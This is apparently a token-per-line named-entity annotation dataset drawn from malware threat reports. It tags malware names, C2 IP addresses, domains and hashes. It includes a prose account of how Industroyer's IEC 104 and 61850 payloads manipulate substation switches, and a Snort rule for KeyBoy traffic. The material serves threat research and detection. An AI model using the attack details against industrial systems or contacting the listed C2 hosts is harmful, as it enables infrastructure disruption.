as	O
to	O
call	O
it	O
'	O
analogous	O
to	O
bringing	O
a	O
Lamborghini	O
to	O
a	O
go-cart	O
race'.Considering	O
the	O
limited	O
timeframe	O
scope	O
and	O
target	O
list	O
,	O
McAfee	O
suggested	O
the	O
motivation	O
of	O
the	O
attack	O
was	O
a	O
cyber	O
war	O
exercise	O
to	O
test	O
the	O
preparedness	O
of	O
South	O
Korea	O
's	O
cyber	O
defense	O
capabilities	O
and	O
to	O
better	O
understand	O
the	O
technical	O
requirements	O
for	O
a	O
successful	O
campaign	O
.	O

Table	O
1	O
:	O
Description	O
of	O
TRITON	B-malware.infosteal
Malware	O
The	O
attacker	O
gained	O
remote	O
access	O
to	O
an	O
SIS	O
engineering	O
workstation	O
and	O
deployed	O
the	O
TRITON	B-malware.infosteal
attack	O
framework	O
to	O
reprogram	O
the	O
SIS	O
controllers	O
.	O

The	O
name	O
comes	O
from	O
the	O
pdb	O
path	O
of	O
this	O
type	O
of	O
Trojan	B-malware.backdoor
with	O
the	O
label	O
Retro	B-malware.backdoor
,	O
and	O
also	O
has	O
the	O
word	O
Retro	B-malware.backdoor
in	O
the	O
initial	O
installer	O
.	O

It	O
is	O
compiled	O
on	O
15-04-2016	O
and	O
is	O
coded	O
in	O
Visual	O
Basic	O
.	O

The	O
screenshots	O
are	O
continuously	O
saved	O
as	O
.jpg	O
images	O
.	O

One	O
simple	O
example	O
of	O
how	O
the	O
emails	O
in	O
this	O
phishing	O
campaign	O
are	O
related	O
is	O
that	O
the	O
Command	O
and	O
Control	O
node	O
(	O
184.22.201[.]27	B-ip.unknown
)	O
that	O
the	O
malware	O
communicates	O
with	O
is	O
shared	O
by	O
two	O
separate	B-malware.backdoor
phishing	O
emails	O
in	O
this	O
campaign	O
,	O
as	O
shown	O
in	O
the	O
diagram	O
below	O
.	O

It	O
is	O
not	O
likely	O
that	O
existing	O
or	O
external	O
conditions	O
,	O
in	O
isolation	O
,	O
caused	O
a	O
fault	O
during	O
the	O
time	O
of	O
the	O
incident	O
.	O

4111	O

With	O
a	O
communication	O
channel	O
between	O
the	O
server	O
variant	O
and	O
the	O
client	O
established	O
,	O
the	O
server	O
sends	O
information	O
about	O
the	O
victim	O
's	O
computer	O
.	O

as	O
described	O
in	O
the	O
previous	O
section	O
.	O

Password	O
writeLogMsg	O
:	O
]	O

The	O
drawing	O
of	O
personal	O
educated	O
conclusions	O
is	O
left	O
as	O
an	O
exercise	O
for	O
the	O
interested	O
reader	O
.	O

Most	O
developers	O
of	O
similar	O
anticensorship	O
,	O
circumvention	O
,	O
and	O
security	O
tools	O
have	O
implemented	O
this	O
security	O
measure	O
.	O

The	O
configuration	O
data	O
for	O
CozyDuke	B-malware.drop
is	O
stored	O
as	O
a	O
separate	O
RC4-encrypted	O
file	O
that	O
is	O
written	O
to	O
disk	O
by	O
the	O
CozyDuke	B-malware.drop
dropper	O
during	O
initial	O
infection	O
.	O

It	O
is	O
a	O
computerized	O
control	O
system	O
consisting	O
of	O
computers	O
,	O
software	O
applications	O
and	O
controllers	O
.	O

We	O
hacked	O
#	O
WADA	O
.	O

DarkComet	B-malware.backdoor
MUTEX	O
NETDATA	O
1C638B4887FFE980B0B9AE72B1EA40A3	O
6919E62BE39D94F6ACCFAB68D5ED4BD67BA333	O
192.168.100.75:1604	B-ip.unknown
6811E636E69E9AEFA5C6	O
1F55B176A69A9A	O
0123456789	O
Guest16	O
DC_MUTEX-F54S21D	O

IEC	O
60870-5-104	O
)	O
,	O
an	O
international	O
standard	O
The	O
IEC	O
104	O
protocol	O
extends	O
IEC	O
101	O
,	O
so	O
the	O
protocol	O
can	O
be	O
transmitted	O
over	O
a	O
TCP/IP	O
network	O
Due	O
to	O
its	O
highly	O
configurable	O
nature	O
,	O
this	O
payload	O
can	O
be	O
customized	O
by	O
the	O
attackers	O
for	O
different	O
infrastructures	O
Figure	O
8	O
shows	O
what	O
a	O
configuration	O
file	O
may	O
look	O
like	O
Once	O
executed	O
,	O
the	O
104	O
payload	O
DLL	O
attempts	O
to	O
read	O
its	O
configuration	O
file	O
As	O
described	O
above	O
,	O
the	O
path	O
for	O
the	O
configuration	O
file	O
is	O
supplied	O
by	O
the	O
Launcher	O
component	O
The	O
configuration	O
contains	O
a	O
section	O
followed	O
by	O
properties	O
that	O
configure	O
how	O
the	O
104	O
payload	O
should	O
work	O
The	O
configuration	O
may	O
contain	O
multiple	O
entries	O
Our	O
analysis	O
of	O
this	O
component	O
reveals	O
the	O
following	O
possible	O
configuration	O
properties	O
:	O
Property	O
target_ip	O
Expected	O
value	O
IP	O
address	O
target_port	O
uselog	O
Port	O
number	O
1	O
or	O
0	O
logfile	O
Filename	O
stop_comm_	O
service	O
stop_comm_	O
service_name	O
timeout	O
socket_timeout	O
silence	O
asdu	O
1	O
or	O
0	O
Process	O
name	O
Timeout	O
in	O
milliseconds	O
Timeout	O
in	O
milliseconds	O
1	O
or	O
0	O
Integer	O
first_action	O
on	O
or	O
off	O
change	O
1	O
or	O
0	O
command_type	O
def	O
or	O
short	O
or	O
long	O
or	O
persist	O
Purpose	O
The	O
IP	O
address	O
that	O
will	O
be	O
used	O
for	O
the	O
communication	O
using	O
IEC	O
104	O
protocol	O
standard	O
Self-explanatory	O
Enables	O
or	O
disables	O
logging	O
to	O
a	O
file	O
Specifies	O
the	O
filename	O
for	O
the	O
log	O
,	O
if	O
enabled	O
Enables	O
or	O
disables	O
termination	O
of	O
the	O
process	O
Specifies	O
the	O
process	O
name	O
that	O
will	O
be	O
terminated	O
Specifies	O
timeout	O
between	O
send	O
and	O
recv	O
calls	O
Default	O
value	O
:	O
15000	O
Specify	O
the	O
receiving	O
timeout	O
Default	O
value	O
:	O
15000	O
Enables	O
or	O
disables	O
console	O
output	O
Specifies	O
ASDU	O
(	O
Application	O
Service	O
Data	O
Unit	O
)	O
address	O
also	O
known	O
as	O
sector	O
Specifies	O
the	O
Switch	O
value	O
in	O
ASDU	O
packet	O
for	O
first	O
iteration	O
Specifies	O
that	O
the	O
Switch	O
value	O
in	O
ASDU	O
packet	O
should	O
be	O
inverted	O
during	O
iterations	O
Specifies	O
command	O
pulse	O
duration	O
for	O
qualifier	O
of	O
command	O
(	O
QOC	O
)	O
Property	O
operation	O
range	O
sequence	O
shift	O
Expected	O
value	O
range	O
or	O
sequence	O
or	O
shift	O
Specific	O
format	O
of	O
IOAs	O
Specific	O
format	O
of	O
IOAs	O
Specific	O
formatof	O
IOAs	O
Purpose	O
Specifies	O
iteration	O
type	O
for	O
Information	O
Object	O
Addresses	O
(	O
IOA	O
)	O
Specifies	O
range	O
of	O
Information	O
Object	O
Addresses	O
(	O
IOA	O
)	O
Specifies	O
sequence	O
of	O
Information	O
Object	O
Addresses	O
(	O
IOA	O
)	O
Specifies	O
shift	O
of	O
Information	O
Object	O
Addresses	O
(	O
IOA	O
)	O
Once	O
the	O
configuration	O
file	O
is	O
read	O
,	O
the	O
104	O
payload	O
creates	O
a	O
thread	O
for	O
each	O
STATION	O
section	O
defined	O
in	O
the	O
configuration	O
file	O
In	O
each	O
such	O
thread	O
,	O
the	O
104	O
payload	O
will	O
attempt	O
to	O
communicate	O
with	O
the	O
specified	O
IP	O
address	O
using	O
the	O
protocol	O
described	O
in	O
the	O
IEC	O
104	O
standard	O
Before	O
the	O
connection	O
is	O
made	O
,	O
the	O
104	O
payload	O
attempts	O
to	O
terminate	O
the	O
legitimate	O
process	O
that	O
is	O
normally	O
responsible	O
for	O
IEC	O
104	O
communication	O
with	O
the	O
device	O
It	O
does	O
so	O
only	O
if	O
the	O
property	O
is	O
specified	O
in	O
its	O
configuration	O
By	O
default	O
,	O
the	O
104	O
payload	O
terminates	O
the	O
process	O
named	O
,	O
or	O
the	O
process	O
name	O
specified	O
in	O
its	O
configuration	O
The	O
main	O
idea	O
behind	O
the	O
104	O
payload	O
is	O
relatively	O
simple	O
It	O
connects	O
to	O
the	O
specified	O
IP	O
address	O
and	O
starts	O
to	O
send	O
packets	O
with	O
the	O
ASDU	O
address	O
that	O
was	O
defined	O
in	O
its	O
configuration	O
The	O
goal	O
of	O
this	O
communication	O
is	O
to	O
interact	O
with	O
an	O
IOA	O
of	O
a	O
single	O
command	O
type	O
In	O
the	O
configuration	O
file	O
,	O
the	O
attacker	O
can	O
define	O
the	O
property	O
to	O
specify	O
exactly	O
how	O
single	O
command	O
type	O
IOAs	O
will	O
be	O
iterated	O
The	O
first	O
such	O
mode	O
is	O
the	O
mode	O
The	O
attackers	O
use	O
this	O
mode	O
in	O
order	O
to	O
discover	O
possible	O
IOAs	O
in	O
the	O
targeted	O
device	O
The	O
attackers	O
have	O
to	O
take	O
this	O
approach	O
because	O
the	O
protocol	O
described	O
in	O
the	O
IEC	O
104	O
standard	O
does	O
not	O
provide	O
a	O
specific	O
method	O
to	O
obtain	O
such	O
information	O
mode	O
has	O
two	O
stages	O
During	O
the	O
first	O
stage	O
,	O
once	O
the	O
range	O
of	O
IOAs	O
is	O
obtained	O
from	O
the	O
configuration	O
file	O
,	O
the	O
104	O
payload	O
connects	O
to	O
the	O
target	O
IP	O
address	O
and	O
starts	O
to	O
iterate	O
through	O
the	O
specified	O
IOAs	O
To	O
each	O
such	O
IOA	O
the	O
104	O
payload	O
sends	O
'	O
select	O
and	O
execute	O
'	O
packets	O
in	O
order	O
to	O
switch	O
the	O
state	O
and	O
to	O
confirm	O
whether	O
the	O
IOA	O
belongs	O
to	O
the	O
single	O
command	O
type	O
enabled	O
,	O
so	O
between	O
loop	O
iterations	O
the	O
payload	O
flipped	O
the	O
switch	O
value	O
from	O
On	O
to	O
Off	O
and	O
wrote	O
it	O
to	O
the	O
log	O
Once	O
all	O
possible	O
IOAs	O
from	O
the	O
specified	O
range	O
are	O
iterated	O
,	O
the	O
104	O
payload	O
switches	O
to	O
the	O
second	O
stage	O
of	O
mode	O
If	O
logging	O
is	O
enabled	O
,	O
the	O
payload	O
writes	O
to	O
the	O
log	O
The	O
rest	O
of	O
this	O
second	O
stage	O
is	O
an	O
infinite	O
loop	O
that	O
uses	O
the	O
previously	O
discovered	O
IOAs	O
of	O
single	O
command	O
type	O
In	O
the	O
loop	O
the	O
payload	O
constantly	O
sends	O
'	O
select	O
and	O
execute	O
'	O
packets	O
In	O
addition	O
,	O
if	O
the	O
option	O
change	O
is	O
defined	O
,	O
the	O
payload	O
flips	O
the	O
On/Off	O
state	O
between	O
loop	O
steps	O
Figure	O
10	O
demonstrates	O
the	O
log	O
file	O
that	O
was	O
produced	O
by	O
the	O
104	O
payload	O
during	O
our	O
analysis	O
It	O
shows	O
the	O
payload	O
iterated	O
IOAs	O
from	O
10	O
to	O
15	O
,	O
and	O
once	O
IOAs	O
of	O
the	O
single	O
command	O
type	O
were	O
discovered	O
,	O
the	O
payload	O
started	O
to	O
use	O
them	O
in	O
the	O
loop	O
The	O
configuration	O
had	O
the	O
option	O
The	O
second	O
mode	O
is	O
the	O
mode	O
This	O
is	O
very	O
similar	O
to	O
the	O
range	O
mode	O
The	O
attacker	O
defines	O
,	O
in	O
the	O
configuration	O
file	O
,	O
a	O
range	O
of	O
IOAs	O
and	O
shift	O
values	O
Once	O
the	O
104	O
payload	O
is	O
activated	O
it	O
does	O
everything	O
the	O
same	O
way	O
as	O
in	O
mode	O
;	O
however	O
,	O
once	O
all	O
IOAs	O
in	O
the	O
defined	O
range	O
are	O
iterated	O
,	O
it	O
starts	O
to	O
iterate	O
over	O
the	O
new	O
range	O
The	O
new	O
range	O
is	O
calculated	O
by	O
adding	O
the	O
shift	O
values	O
to	O
the	O
default	O
range	O
values	O
The	O
third	O
mode	O
is	O
the	O
mode	O
It	O
can	O
be	O
used	O
by	O
attackers	O
once	O
they	O
know	O
the	O
values	O
of	O
all	O
IOAs	O
of	O
the	O
single	O
command	O
type	O
that	O
are	O
supported	O
by	O
the	O
connected	O
device	O
This	O
payload	O
immediately	O
executes	O
an	O
infinite	O
loop	O
,	O
sending	O
'	O
select	O
and	O
execute	O
'	O
packets	O
to	O
the	O
IOAs	O
defined	O
in	O
the	O
configuration	O
file	O
Aside	O
from	O
its	O
logging	O
capability	O
,	O
the	O
104	O
payload	O
can	O
output	O
debug	O
information	O
to	O
the	O
console	O
,	O
as	O
seen	O
in	O
Figure	O
11	O
Unlike	O
the	O
101	O
and	O
104	O
payloads	O
,	O
this	O
payload	O
component	O
exists	O
as	O
a	O
standalone	O
malicious	O
tool	O
comprising	O
an	O
executable	O
named	O
and	O
the	O
It	O
is	O
named	O
after	O
the	O
IEC	O
61850	O
standard	O
This	O
standard	O
describes	O
a	O
protocol	O
used	O
for	O
multivendor	O
communication	O
among	O
devices	O
that	O
perform	O
protection	O
,	O
automation	O
,	O
metering	O
,	O
monitoring	O
,	O
and	O
control	O
of	O
electrical	O
substation	O
automation	O
systems	O
The	O
protocol	O
is	O
very	O
complex	O
and	O
robust	O
,	O
but	O
the	O
61850	O
payload	O
uses	O
only	O
a	O
small	O
subset	O
of	O
the	O
protocol	O
to	O
produce	O
its	O
disruptive	O
effect	O
Once	O
executed	O
,	O
the	O
61850	O
payload	O
DLL	O
attempts	O
to	O
read	O
the	O
configuration	O
file	O
,	O
the	O
path	O
to	O
which	O
is	O
supplied	O
by	O
the	O
Launcher	O
component	O
The	O
standalone	O
version	O
defaults	O
to	O
reading	O
its	O
configuration	O
from	O
The	O
configuration	O
file	O
is	O
expected	O
to	O
contain	O
a	O
list	O
of	O
IP	O
addresses	O
of	O
devices	O
capable	O
of	O
communicating	O
via	O
the	O
protocol	O
described	O
in	O
the	O
IEC	O
61850	O
standard	O
If	O
the	O
configuration	O
file	O
is	O
not	O
present	O
,	O
then	O
this	O
component	O
enumerates	O
all	O
connected	O
network	O
adaptors	O
to	O
determine	O
their	O
TCP/IP	O
subnet	O
masks	O
The	O
61850	O
payload	O
then	O
enumerates	O
all	O
possible	O
IP	O
addresses	O
for	O
each	O
of	O
these	O
subnet	O
masks	O
,	O
and	O
tries	O
to	O
connect	O
to	O
port	O
102	O
on	O
each	O
of	O
those	O
addresses	O
Therefore	O
,	O
this	O
component	O
has	O
the	O
ability	O
to	O
discover	O
relevant	O
devices	O
in	O
the	O
network	O
automatically	O
Otherwise	O
,	O
if	O
a	O
configuration	O
file	O
is	O
present	O
and	O
it	O
contains	O
target	O
IP	O
addresses	O
,	O
this	O
component	O
connects	O
to	O
port	O
102	O
on	O
those	O
IP	O
addresses	O
and	O
on	O
IP	O
addresses	O
that	O
were	O
discovered	O
automatically	O
Once	O
this	O
component	O
connects	O
to	O
a	O
target	O
host	O
,	O
it	O
sends	O
a	O
Connection	O
Request	O
packet	O
using	O
the	O
Connection	O
Oriented	O
Transport	O
Protocol	O
,	O
as	O
seen	O
in	O
Figure	O
12	O

Posing	O
to	O
be	O
from	O
the	O
Palestinian	O
Political	O
and	O
National	O
Guidance	O
Commission	O
,	O
the	O
Word	O
document	O
serves	O
as	O
a	O
decoy	O
,	O
distracting	O
victims	O
while	O
the	O
malware	O
is	O
installed	O
in	O
the	O
background	O
.	O

6939	O
-	O
HURRICANE	O
-	O
Hurricane	O
Electric	O
,	O
Inc	O
.	O

True	O
threat	O
intelligence	O
requires	O
reaching	O
beyond	O
malware	O
infections	O
to	O
identify	O
the	O
individuals	O
,	O
country	O
of	O
origin	O
,	O
and	O
intent	O
of	O
the	O
attacker	O
.	O

2016	O
.	O

and	O
the	O
path	O
is	O
fixed	O
:	O

The	O
spying	O
activities	O
are	O
performed	O
either	O
through	O
the	O
Babar	B-malware.drop
instance	O
locally	O
or	O
via	O
a	O
global	O
Windows	O
hook	O
invading	O
all	O
processes	O
running	O
in	O
the	O
same	O
desktop	O
.	O

The	O
file	O
is	O
then	O
uploaded	O
during	O
the	O
next	O
C	O
&	O
C	O
communication	O
cycle	O
.	O

This	O
version	O
is	O
the	O
most	O
advanced	O
variant	O
of	O
GravityRAT	B-malware.drop
.	O

The	O
KillDisk	B-malware.ransom
malware	O
used	O
in	O
the	O
first	O
wave	O
of	O
December	O
2016	O
attacks	O
,	O
instead	O
of	O
encrypting	O
,	O
simply	O
overwrites	O
targeted	O
files	O
.	O

204.152.203.99	B-ip.unknown

The	O
content	O
of	O
the	O
document	O
is	O
the	O
following	O
:	O
This	O
time	O
the	O
bait	O
appears	O
to	O
be	O
related	O
to	O
the	O
state	O
of	O
telecommunication	O
infrastructure	O
in	O
the	O
district	O
of	O
Calcutta	O
in	O
India	O
,	O
discussing	O
the	O
coverage	O
of	O
GSM	O
networks	O
and	O
availability	O
and	O
stability	O
of	O
broadband	O
connections	O
.	O

The	O
CLSID	O
was	O
only	O
used	O
in	O
this	O
version	O
.	O

However	O
,	O
it	O
is	O
possible	O
,	O
that	O
the	O
Sofacy	O
group	O
could	O
utilize	O
this	O
server	O
as	O
a	O
vector	O
to	O
deliver	O
malicious	O
code	O
to	O
the	O
banking	O
victims	O
in	O
an	O
attempt	O
to	O
obtain	O
access	O
to	O
the	O
network	O
.	O

Once	O
it	O
has	O
reached	O
its	O
target	O
,	O
the	O
payload	O
used	O
was	O
designed	O
to	O
work	O
as	O
an	O
information	O
stealer	O
and	O
reconnaissance	O
tool	O
.	O

Message	O
body	O
.	O
'	O

We	O
believe	O
the	O
first	O
string	O
to	O
be	O
a	O
unique	O
ID	O
of	O
the	O
target	O
or	O
sample	O
.	O

from	O
the	O
C2	O
response	O
it	O
extracts	O
two	O
things	O
a	O
)	O
URL	O
to	O
download	O
an	O
executable	O
file	O
and	O
b	O
)	O
the	O
command	O
string	O
that	O
will	O
trigger	O
the	O
download	O
functionality	O

This	O
exploit	O
caught	O
by	O
our	O
technologies	O
highlights	O
a	O
few	O
very	O
interesting	O
evasion	O
methods	O
,	O
some	O
of	O
which	O
we	O
have	O
n't	O
seen	O
before	O
.	O

In	O
June	O
2016	O
,	O
shortly	O
after	O
the	O
DNC	O
's	O
announcement	O
,	O
the	O
Guccifer	O
2.0	O
persona	O
claimed	O
responsibility	O
for	O
the	O
DNC	O
breach	O
and	O
leaked	O
documents	O
taken	O
from	O
the	O
organization	O
's	O
network	O
.	O

'	O
Franceschi-Bicchierai	O
,	O
Lorenzo	O
.	O

According	O
to	O
Insikt	O
Group	O
's	O
source	O
,	O
to	O
find	O
and	O
retain	O
the	O
best	O
offensive	O
cyber	O
talent	O
,	O
Iranian	O
government	O
contractors	O
are	O
forced	O
to	O
mine	O
closed-trust	O
communities	O
.	O

Not	O
a	O
single	O
sample	O
that	O
we	O
have	O
found	O
in	O
this	O
campaign	O
has	O
employed	O
a	O
0-day	O
vulnerability	O
.	O

We	O
discovered	O
that	O
this	O
backdoor	O
was	O
developed	O
by	O
the	O
Iron	O
cybercrime	O
group	O
,	O
the	O
same	O
group	O
behind	O
the	O
Iron	O
ransomware	O
(	O
rip-off	O
Maktub	O
ransomware	O
recently	O
discovered	O
by	O
Bart	O
Parys	O
)	O
,	O
which	O
we	O
believe	O
has	O
been	O
active	O
for	O
the	O
past	O
18	O
months	O
.	O

Both	O
create	O
one	O
thread	O
,	O
and	O
each	O
thread	O
is	O
responsible	O
for	O
either	O
downloading	O
and	O
executing	O
the	O
file	O
or	O
running	O
a	O
command	O
line	O
program	O
in	O
the	O
terminal	O
:	O

Around	O
October	O
2012	O
,	O
we	O
observed	O
that	O
the	O
behavior	O
of	O
FinSpy	B-malware.backdoor
servers	O
began	O
to	O
change	O
.	O

Registration	O
form	O
to	O
the	O
United	O
Nations	O
CTITF	O
(	O
Counter	O
Terrorism	O
Implementation	O
Task	O
Force	O
)	O
.	O

This	O
adversary	O
has	O
a	O
wide	O
range	O
of	O
implants	O
at	O
their	O
disposal	O
,	O
which	O
have	O
been	O
developed	O
over	O
the	O
course	O
of	O
many	O
years	O
and	O
include	O
Sofacy	O
,	O
X-Agent	B-malware.infosteal
,	O
X-Tunnel	B-malware.unknown
,	O
WinIDS	O
,	O
Foozer	O
and	O
DownRange	O
droppers	O
,	O
and	O
even	O
malware	O
for	O
Linux	O
,	O
OSX	O
,	O
IOS	O
,	O
Android	O
and	O
Windows	O
Phones	O
.	O

Depending	O
on	O
the	O
version	O
of	O
the	O
victim	O
's	O
OS	O
,	O
the	O
driver	O
will	O
hook	O
the	O
Windows	O
Firewall	O
by	O
either	O
using	O
the	O
surprisingly	O
undocumented	O
IOCTL_IP_SET_FIREWALL_HOOK	O
command	O
of	O
the	O
\\Device\	O
IP	O
device	O
for	O
Windows	O
XP	O
or	O
older	O
machines	O
or	O
by	O
using	O
the	O
documented	O
Windows	O
Filtering	O
Platform	O
(	O
WFP	O
)	O
found	O
in	O
Windows	O
Vista	O
and	O
later	O
.	O

The	O
cryptominer	O
botnet	O
attacked	O
over	O
half	O
a	O
million	O
Windows	O
servers	O
and	O
computers	O
so	O
far	O
...	O
but	O
that	O
number	O
is	O
growing	O
.	O

CVE-2015-5374	O
vulnerability	O
in	O
order	O
to	O
render	O
a	O
device	O
unresponsive	O
Once	O
this	O
vulnerability	O
is	O
successfully	O
exploited	O
,	O
the	O
target	O
device	O
stops	O
responding	O
to	O
any	O
commands	O
until	O
it	O
is	O
rebooted	O
manually	O
To	O
exploit	O
this	O
vulnerability	O
the	O
attackers	O
hardcoded	O
the	O
device	O
IP	O
addresses	O
into	O
this	O
tool	O
Once	O
the	O
tool	O
is	O
executed	O
it	O
sends	O
specifically	O
crafted	O
packets	O
to	O
port	O
50,000	O
of	O
the	O
target	O
IP	O
addresses	O
using	O
UDP	O
The	O
UDP	O
packet	O
contains	O
only	O
18	O
bytes	O
The	O
investigation	O
behind	O
the	O
Ukrainian	O
power	O
outage	O
last	O
December	O
is	O
still	O
ongoing	O
and	O
it	O
is	O
currently	O
not	O
confirmed	O
that	O
the	O
malware	O
analyzed	O
here	O
was	O
the	O
direct	O
cause	O
Nevertheless	O
,	O
we	O
believe	O
that	O
to	O
be	O
a	O
very	O
probable	O
explanation	O
,	O
as	O
the	O
malware	O
is	O
able	O
to	O
directly	O
control	O
switches	O
and	O
circuit	O
breakers	O
at	O
power	O
grid	O
substations	O
using	O
four	O
ICS	O
protocols	O
and	O
contains	O
an	O
activation	O
timestamp	O
for	O
December	O
17	O
,	O
2016	O
,	O
the	O
day	O
of	O
the	O
power	O
outage	O
We	O
can	O
definitely	O
say	O
that	O
the	O
Win32/Industroyer	B-malware.backdoor
malware	O
family	O
is	O
an	O
advanced	O
and	O
sophisticated	O
piece	O
of	O
malware	O
that	O
is	O
used	O
against	O
industrial	O
control	O
systems	O
However	O
,	O
it	O
should	O
be	O
noted	O
that	O
the	O
malware	O
itself	O
is	O
just	O
a	O
tool	O
in	O
the	O
hands	O
of	O
an	O
even	O
more	O
advanced	O
and	O
very	O
capable	O
malicious	O
actor	O
Using	O
logs	O
produced	O
by	O
the	O
toolset	O
and	O
highly	O
configurable	O
payloads	O
,	O
the	O
attackers	O
could	O
adapt	O
the	O
malware	O
to	O
any	O
comparable	O
environment	O
The	O
commonly-used	O
industrial	O
control	O
protocols	O
used	O
in	O
this	O
malware	O
were	O
designed	O
decades	O
ago	O
without	O
taking	O
security	O
into	O
consideration	O
Therefore	O
,	O
any	O
intrusion	O
into	O
an	O
industrial	O
network	O
with	O
systems	O
using	O
these	O
protocols	O
should	O
be	O
considered	O
as	O
'	O
game	O
over	O
'	O
Warning	O
!	O

blog.crowdstrike.com/ironman-deep-panda-uses-sakula-malware-target-organizations-multiple-sectors/	B-url.normal
http://krebsonsecurity.com/2015/02/anthem-breach-may-have-started-in-april-2014/	B-url.normal

All	O
strings	O
below	O
are	O
encrypted	O
via	O
AES256	O
and	O
base64	O
encoding	O
.	O

ED53831468DDF4220E1DC3C3398F7F39	B-hash
natco1.no-ip.net	B-url.cncsvr

45.114.117[.]137	B-ip.unknown
)	O
support.chatconnecting(.)com	B-url.cncsvr

The	O
malicious	O
code	O
within	O
Telegram	O
and	O
WhatsApp	O
sent	O
collected	O
data	O
to	O
the	O
server	O
techwach[.]com	B-url.unknown
.	O

These	O
are	O
MINGW32	O
C++	O
(	O
not	O
Python	O
)	O
executables	O
which	O
have	O
only	O
one	O
function	O
–	O
to	O
insert	O
a	O
registry	O
key	O
that	O
allows	O
other	O
malware	O
to	O
be	O
run	O
on	O
startup	O
.	O

The	O
original	O
application	O
central	O
to	O
this	O
discussion	O
,	O
30.apk	B-malware.backdoor
,	O
was	O
initially	O
developed	O
domestically	O
within	O
Ukraine	O
by	O
a	O
member	O
of	O
the	O
55th	O
Artillery	O
Brigade	O
.	O

6	O
An	O
example	O
of	O
the	O
ZKM	O
obfuscated	O
JRat	B-malware.backdoor
code	O
.	O

Energetic	O
Bear/Crouching	O
Yeti	O
is	O
a	O
widely	O
known	O
APT	O
group	O
active	O
since	O
at	O
least	O
2010	O
.	O

This	O
backdoor	O
was	O
accessible	O
from	O
HTTP	O
;	O
however	O
,	O
it	O
was	O
encrypted	O
,	O
so	O
the	O
attacker	O
would	O
have	O
to	O
have	O
the	O
password	O
in	O
order	O
to	O
use	O

The	O
first	O
parameter	O
CONTEXT	O
structure	O
is	O
also	O
carefully	O
constructed	O
by	O
the	O
attacker	O
.	O

Firstly	O
,	O
thanks	O
to	O
the	O
fixed	O
patterns	O
used	O
by	O
the	O
malware	O
in	O
the	O
authentication	O
procedure	O
,	O
we	O
can	O
detect	O
outbound	O
traffic	O
from	O
infected	O
hosts	O
with	O
the	O
following	O
simple	O
Snort	O
rule	O
:	O
alert	O
tcp	O
$	O
HOME_NET	O
any	O
-	O
>	O
$	O
EXTERNAL_NET	O
any	O
(	O
msg	O
:	O
'	O
KeyBoy	O
Backdoor	O
Login	O
'	O
;	O
flow	O
:	O
to_server	O
;	O
content	O
:	O
'	O
|	O
c4	O
4c	O
87	O
3f	O
11	O
1e	O
c4	O
1a	O
|	O
'	O
;	O
depth:8	O
;	O
sid:1000001	O
;	O
rev:1	O
;	O
classtype	O
:	O
trojan-activity	O
;	O
reference:url,community.rapid7.com/community/infosec/blog/2013/06/07/keyboy-tar	O
geted-attacks-against-vietnam-and-india	O
)	O
The	O
simplest	O
way	O
to	O
identify	O
an	O
infection	O
on	O
a	O
given	O
Windows	O
system	O
,	O
is	O
just	O
to	O
look	O
for	O
the	O
existence	O
of	O
the	O
file	O
C:\WINDOWS\system32\CREDRIVER.dll	O
or	O
of	O
a	O
service	O
called	O
MdAdum	O
.	O

In	O
this	O
blog	O
post	O
we	O
add	O
a	O
new	O
piece	O
to	O
the	O
puzzle	O
with	O
Dino	B-malware.backdoor
,	O
another	O
malicious	O
program	O
belonging	O
to	O
Animal	O
Farm	O
's	O
arsenal	O
.	O

The	O
attackers	O
were	O
responsible	O
for	O
pilfering	O
email	O
archives	O
and	O
documents	O
from	O
Telenor	O
executives	O
,	O
compromising	O
their	O
intellectual	O
property	O
and	O
business	O
operations	O
.	O

The	O
dropper	O
bla.exe	B-malware.drop
does	O
not	O
include	O
an	O
environment	O
check	O
for	O
either	O
Cuckoo	O
or	O
VMware	O
.	O

Related	O
Turla	O
sample	O
module	O

The	O
following	O
picture	O
shows	O
the	O
multi-stage	O
attack	O
:	O

The	O
attacker	O
content	O
on	O
the	O
compromised	O
sap.misapor[.]ch	B-url.unknown
site	O
was	O
not	O
accessible	O
at	O
the	O
time	O
of	O
writing	O
.	O

Muslim	O
dating	O
site	O
Water	O
treatment	O
Hotels	O
Embassy	O
in	O
T	O
urkey	O
Software	O
developer	O
Airport	O
website	O
City	O
council	O
website	O
Cosmetics	O
manufacturer	O
Religious	O
website	O
T	O
urktelekom	O
subnet	O
with	O
a	O
large	O
number	O
of	O
sites	O
T	O
elnet	O
T	O
elecom	O
subnet	O
with	O
a	O
large	O
number	O
of	O
sites	O
Personal	O
website	O
of	O
a	O
journalist	O
Unknown	O
web	O
server	O
Office	O
supplies	O
online	O
store	O
Floral	O
business	O
Image	O
hosting	O
service	O
Online	O
course	O
on	O
sales	O
Dealer	O
of	O
farming	O
equipment	O
and	O
spare	O
parts	O
Ukrainian	O
civil	O
servant	O
's	O
personal	O
website	O
Online	O
store	O
of	O
parts	O
for	O
household	O
appliance	O
repair	O

Web	O
.	O

Based	O
on	O
our	O
logs	O
,	O
Cisco	O
AMP	O
found	O
the	O
sample	O
twice	O
on	O
2015-12-20	O
.	O

We	O
believe	O
the	O
attackers	O
used	O
their	O
personal	O
phone	O
to	O
test	O
the	O
MDM	B-malware.infosteal
because	O
they	O
included	O
devices	O
named	O
'	O
Test	O
'	O
and	O
'	O
mdmdev	O
.	O
'	O

2	O
.	O

msprivs.exe	O
97fdab2832550b9fea80ec1b9	B-hash
c182f5139e9e947	I-hash

The	O
whole	O
process	O
of	O
installation	O
and	O
execution	O
relies	O
heavily	O
on	O
multiple	O
layers	O
of	O
obfuscation	O
such	O
as	O
decryption	O
of	O
payloads	O
,	O
PE	O
reconstruction	O
and	O
loading	O
shellcode	O
,	O
and	O
side-loading	O
techniques	O
.	O

In	O
other	O
cases	O
,	O
the	O
visitor	O
was	O
redirected	O
via	O
HTTP	O
301	O
response	O
to	O
a	O
legitimate	O
unrelated	O
website	O
-	O
www.onlinepcsupport.co.uk	B-url.normal
.	O

User-Agent	O
:	O
4	B-hash
fe4b9560e99e33dabca553e2eeee510	I-hash

The	O
C	O
&	O
C	O
communication	O
module	O
is	O
located	O
in	O
an	O
export	O
of	O
the	O
DLL	O
,	O
which	O
will	O
be	O
executed	O
through	O
a	O
remote	O
thread	O
,	O
injected	O
like	O
the	O
child	O
processes	O
,	O
via	O
a	O
memory-mapped	O
file	O
.	O

A	O
further	O
three	O
large	O
financial	O
institutions	O
in	O
Turkey	O
were	O
victims	O
of	O
this	O
attack	O
.	O

It	O
is	O
highly	O
likely	O
that	O
the	O
malware	O
and	O
decoy	O
document	O
would	O
be	O
tailored	O
for	O
and	O
delivered	O
to	O
specific	O
recipients	O
